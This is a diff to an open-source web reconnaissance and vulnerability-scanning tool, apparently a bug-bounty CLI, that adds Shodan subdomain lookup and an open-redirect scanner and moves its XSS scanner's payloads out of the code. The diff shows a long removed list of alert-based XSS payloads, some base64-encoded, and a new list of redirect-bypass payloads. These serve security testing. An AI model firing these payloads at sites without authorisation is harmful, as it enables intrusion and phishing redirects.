@@ -55,7 +55,7 @@ banner = """
 ╚════██║██╔═══╝   ╚██╔╝  ██╔══██║██║   ██║██║╚██╗██║   ██║   
 ███████║██║        ██║   ██║  ██║╚██████╔╝██║ ╚████║   ██║   
 ╚══════╝╚═╝        ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝
-V 2.3
+V 2.4
 By c0deninja
 
 """
@@ -271,6 +271,10 @@ fuzzing_group.add_argument('-ch', '--custom_headers',
                     type=str, help='custom headers',
                     metavar='domain.com')
 
+vuln_group.add_argument('-or', '--openredirect',
+                    type=str, help='open redirect', action='store',
+                    metavar='domain.com')
+
 parser.add_argument("-v", "--verbose", action="store_true", help="Increase output verbosity")
 
 parser.add_argument("-c", "--concurrency", type=int, default=10, help="Maximum number of concurrent requests")
@@ -284,6 +288,8 @@ fuzzing_group.add_argument("-e", "--extensions", help="Comma-separated list of f
 fuzzing_group.add_argument("-x", "--exclude", help="Comma-separated list of status codes to exclude", default="")
 
 update_group.add_argument('-u', '--update', action='store_true', help='Update the script')
+
+parser.add_argument('--shodan-api', help='Shodan API key for subdomain enumeration')
 
 
 args = parser.parse_args()
@@ -328,11 +334,47 @@ if args.s:
         certshout = certshout.decode()
         with open(f"{args.save}", "a") as certsh:
             certsh.writelines(certshout)
+
+        # Shodan subdomain extraction
+        if args.shodan_api:
+            api = shodan.Shodan(args.shodan_api)
+            try:
+                results = api.search(f'hostname:*.{args.s}')
+                shodan_subdomains = set()
+                for result in results['matches']:
+                    hostnames = result.get('hostnames', [])
+                    for hostname in hostnames:
+                        if hostname.endswith(args.s) and hostname != args.s:
+                            shodan_subdomains.add(hostname)
+                with open(f"{args.save}", "a") as shodan_file:
+                    for subdomain in sorted(shodan_subdomains):
+                        shodan_file.write(f"{subdomain}\n")
+                print(Fore.GREEN + f"Added {len(shodan_subdomains)} subdomains from Shodan")
+            except shodan.APIError as e:
+                print(Fore.RED + f"Error querying Shodan: {e}")
     else:
         commands(f"subfinder -d {args.s}")
         commands(f"assetfinder -subs-only {args.s} | uniq | sort")
         commands(f"{spotter_path} {args.s} | uniq | sort")
         commands(f"{certsh_path} {args.s} | uniq | sort")
+
+        # Shodan subdomain extraction
+        if args.shodan_api:
+            api = shodan.Shodan(args.shodan_api)
+            try:
+                results = api.search(f'hostname:*.{args.s}')
+                shodan_subdomains = set()
+                for result in results['matches']:
+                    hostnames = result.get('hostnames', [])
+                    for hostname in hostnames:
+                        if hostname.endswith(args.s) and hostname != args.s:
+                            shodan_subdomains.add(hostname)
+                print(Fore.CYAN + "Subdomains found from Shodan:")
+                for subdomain in sorted(shodan_subdomains):
+                    print(subdomain)
+                print(Fore.GREEN + f"Found {len(shodan_subdomains)} subdomains from Shodan")
+            except shodan.APIError as e:
+                print(Fore.RED + f"Error querying Shodan: {e}")
 
 if args.reverseip:
     domain = socket.gethostbyaddr(args.reverseip)
@@ -1260,65 +1302,19 @@ if args.xss_scan:
         return random.choice(encodings)(payload)
 
     def print_vulnerability(vuln):
-        print(f"\n{Fore.RED}XSS vulnerability found:{Fore.RESET}")
-        print(f"URL: {Fore.CYAN}{vuln['url']}{Fore.RESET}")
-        print(f"Parameter: {Fore.YELLOW}{vuln['parameter']}{Fore.RESET}")
-        print(f"Payload: {Fore.MAGENTA}{vuln['payload']}{Fore.RESET}")
-        print(f"Test URL: {Fore.BLUE}{vuln['test_url']}{Fore.RESET}")
-        print(f"Execution Likelihood: {Fore.RED if vuln['execution_likelihood'] == 'High' else Fore.YELLOW}{vuln['execution_likelihood']}{Fore.RESET}")
+        if vuln['execution_likelihood'] == 'High':
+            print(f"\n{Fore.RED}High likelihood XSS vulnerability found:{Fore.RESET}")
+            print(f"URL: {Fore.CYAN}{vuln['url']}{Fore.RESET}")
+            print(f"Parameter: {Fore.YELLOW}{vuln['parameter']}{Fore.RESET}")
+            print(f"Payload: {Fore.MAGENTA}{vuln['payload']}{Fore.RESET}")
+            print(f"Test URL: {Fore.BLUE}{vuln['test_url']}{Fore.RESET}")
 
     def xss_scan_url(url):
         print(f"{Fore.CYAN}Scanning for XSS vulnerabilities: {url}{Fore.RESET}")
         
-        payloads = [
-            "<script>alert('XSS')</script>",
-            "';alert(String.fromCharCode(88,83,83))//",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg/onload=alert('XSS')>",
-            "javascript:alert('XSS')",
-            "<body onload=alert('XSS')>",
-            "<iframe src=\"javascript:alert('XSS')\">",
-            "<input type=\"text\" value=\"\" autofocus onfocus=\"alert('XSS')\">",
-            "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
-            "<a href=\"javascript:alert('XSS')\">Click me</a>",
-            "<div onmouseover=\"alert('XSS')\">Hover over me</div>",
-            "<img src=\"x\" onerror=\"(function(){alert('XSS')})()\">"
-            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
-            "<marquee onstart=alert('XSS')>",
-            "<details ontoggle=\"alert('XSS')\">",
-            "<select autofocus onfocus=alert('XSS')>",
-            "<video src=1 onerror=alert('XSS')>",
-            "<audio src=1 onerror=alert('XSS')>",
-            "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">",
-            "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">",
-            "<svg><set attributeName=onload value=alert('XSS')>",
-            "<math><maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert('XSS')\">",
-            "<form><button formaction=javascript:alert('XSS')>",
-            "<keygen autofocus onfocus=alert('XSS')>",
-            "<input type=image src=x onerror=alert('XSS')>",
-            "<body onpageshow=alert('XSS')>",
-            "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert('XSS')\"></xss>",
-            "<link rel=import href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">",
-            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS');\">",
-            "<iframe srcdoc=\"<img src=x onerror=alert('XSS')>\">",
-            "<table background=\"javascript:alert('XSS')\">",
-            "<a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:alert('XSS')&NewLine;>X</a>",
-            "<script src=\"data:text/javascript,alert('XSS')\"></script>",
-            "<svg><script>alert('XSS')</script>",
-            "<img src=x:alert('XSS') onerror=eval(src)>",
-            "<img src=x:alert('XSS') onerror=eval(src)>",
-            "<svg><a><animate attributeName=href values=javascript:alert('XSS') /><text x=20 y=20>Click me</text></a>",
-            "<svg><animate xlink:href=#xss attributeName=href values=javascript:alert('XSS') /><a id=xss><text x=20 y=20>Click me</text></a>",
-            "<svg><set attributeName=onload value=alert('XSS')>",
-            "<svg><animate attributeName=onload values=alert('XSS')>",
-            "<svg><script xlink:href=data:,alert('XSS')></script>",
-            "<math><mtext><table><mglyph src=x onerror=alert('XSS')>",
-            "<form><button formaction=javascript:alert('XSS')>Click me</button>",
-            "<isindex type=image src=x onerror=alert('XSS')>",
-            "<object data=javascript:alert('XSS')>",
-            "<svg><script>alert&#40;'XSS'&#41;</script>",
-            "<svg><script>alert&#x28;'XSS'&#x29;</script>",
-        ]
+        with open("payloads/xss.txt", "r") as f:
+            payloads = [x.strip() for x in f.readlines()]
+            
         parsed_url = urlparse(url)
         params = parse_qs(parsed_url.query)
         
@@ -1348,11 +1344,8 @@ if args.xss_scan:
                         if re.search(r'<script>.*?alert\([\'"]{}[\'"]\).*?</script>'.format(random_string), response_text, re.IGNORECASE | re.DOTALL) or \
                         re.search(r'on\w+\s*=.*?alert\([\'"]{}[\'"]\)'.format(random_string), response_text, re.IGNORECASE):
                             vulnerability["execution_likelihood"] = "High"
-                        else:
-                            vulnerability["execution_likelihood"] = "Low"
-                        
-                        vulnerabilities.append(vulnerability)
-                        print_vulnerability(vulnerability)
+                            vulnerabilities.append(vulnerability)
+                            print_vulnerability(vulnerability)
                 except requests.RequestException as e:
                     print(f"{Fore.YELLOW}Error scanning {test_url}: {str(e)}{Fore.RESET}")
         
@@ -2068,3 +2061,76 @@ if args.custom_headers:
         if args.verbose:
             print(f"{Fore.CYAN}Verbose mode enabled{Style.RESET_ALL}")
         main(args.custom_headers, args.verbose)
+
+
+if args.openredirect:
+    RED = "\033[91m"
+    GREEN = "\033[92m"
+    YELLOW = "\033[93m"
+    RESET = "\033[0m"
+
+    PAYLOADS = [
+        r"//google.com",
+        r"//www.google.com",
+        r"https://google.com",
+        r"https://www.google.com",
+        r"//google.com/%2f..",
+        r"https://google.com/%2f..",
+        r"////google.com",
+        r"https:////google.com",
+        r"/\/\google.com",
+        r"/.google.com",
+        r"///\;@google.com",
+        r"///google.com@google.com",
+        r"///google.com%40google.com",
+        r"////google.com//",
+        r"/https://google.com",
+    ]
+
+    def test_single_payload(url, payload):
+        try:
+            response = requests.get(f"{url}{payload}", allow_redirects=False, verify=False, timeout=5)
+            if args.verbose:
+                print(f"Testing: {url}{payload}")
+                print(f"Status Code: {response.status_code}")
+                print(f"Location: {response.headers.get('Location', 'N/A')}")
+            if response.status_code in [301, 302, 303, 307, 308]:
+                location = response.headers.get('Location', '')
+                if 'google.com' in location.lower():
+                    print(f"{location}")
+                    return (f"{url}{payload}", location)
+            elif response.status_code == 403:
+                print(f"{url}: {Fore.RED}FORBIDDEN{RESET}")
+        except requests.RequestException as e:
+            if args.verbose:
+                print(f"Error testing {url}{payload}: {str(e)}")
+        return None
+
+    def test_open_redirect(url):
+        vulnerable_urls = []
+        with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as executor:
+            future_to_payload = {executor.submit(test_single_payload, url, payload): payload for payload in PAYLOADS}
+            for future in concurrent.futures.as_completed(future_to_payload):
+                result = future.result()
+                if result:
+                    vulnerable_urls.append(result)
+        return vulnerable_urls
+
+    def process_url(url):
+        print(f"{YELLOW}Testing: {url}{RESET}")
+        vulnerabilities = test_open_redirect(url)
+        if vulnerabilities:
+            print(f"{RED}[VULNERABLE] {url}{RESET}")
+            for vuln_url, redirect_url in vulnerabilities:
+                print(f"  Payload URL: {vuln_url}")
+                print(f"  Redirects to: {redirect_url}")
+            print()
+        else:
+            print(f"{GREEN}[NOT VULNERABLE] {url}{RESET}\n")
+
+    def main():
+        if args.openredirect:
+            process_url(args.openredirect)
+
+    if __name__ == "__main__":
+        main()
